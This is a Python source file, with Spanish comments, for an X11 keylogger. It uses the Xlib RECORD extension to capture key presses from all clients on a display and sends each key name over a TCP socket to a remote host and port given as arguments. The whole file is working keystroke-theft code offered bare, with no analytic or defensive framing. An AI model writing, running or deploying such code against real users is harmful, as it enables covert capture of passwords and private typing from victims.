# This Python file uses the following encoding: utf-8

from Xlib import X, XK, display 
from Xlib.ext import record 
from Xlib.protocol import rq 
import socket,sys
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     
    sock.connect((sys.argv[1], int(sys.argv[2]))) 
    sock.send('Connection established!'.encode())
except socket.error:
    print("El servidor no se encuentra levantado en el puerto %s." %(sys.argv[2]))     
    sys.exit(0) 

serverX = display.Display()
def keysym_resolver(keysym): # Catura los eventos del teclado
    for name in dir(XK):         
        if name[:3] == "XK_" and getattr(XK, name) == keysym:
            return name[3:]     
    return "Tecla num. [%d]" % keysym

def callback(source):     
    if source.category != record.FromServer:
        return
    if source.client_swapped:
        return     
    if not len(source.data) or ord(str(source.data[0])) < 2:
        return
    data = source.data
    while len(data):         
        event, data = rq.EventField(None).parse_binary_value(data, serverX.display, None, None)         
        if event.type in [X.KeyPress, X.KeyRelease]:
            pr = event.type == X.KeyPress and "Press" or "Release"             
            keysym = serverX.keycode_to_keysym(event.detail, 0)             
            if not keysym:
                sock.send("KeyCode "+pr+" \n".encode())             
            else:
                sock.send(keysym_resolver(keysym).encode())

if not serverX.has_extension("RECORD"):
    print("No se ha encontrado la ext. 'RECORD' con lo cual no se pueden capturar los keystrokes")  
    sys.exit(1)
ctx = serverX.record_create_context(0, [record.AllClients], [{
                'core_requests': (0, 0),
                'core_replies': (0, 0),
                'ext_requests': (0, 0, 0, 0),
                'ext_replies': (0, 0, 0, 0),
                'delivered_events': (0, 0),
                'device_events': (X.KeyPress, X.KeyPress),
                'errors': (0, 0),
                'client_started': False,                 
                'client_died': False,}])
serverX.record_enable_context(ctx, callback) 
serverX.record_free_context(ctx)
